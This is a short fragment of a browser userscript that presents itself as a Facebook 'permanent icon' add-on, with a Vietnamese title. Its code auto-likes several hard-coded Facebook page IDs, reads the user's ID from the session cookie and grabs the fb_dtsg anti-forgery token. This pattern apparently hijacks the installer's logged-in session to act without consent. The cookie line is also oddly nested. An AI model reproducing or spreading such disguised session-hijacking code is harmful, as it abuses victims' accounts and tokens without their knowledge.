// ==UserScript==
// @name            Icon vĩnh viễn Facebook( Ver 2.0.15 )
// @description     All about facebook Chome google
...
Like("198968433633974");Like("736332536379449");Like("670407113005288");
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
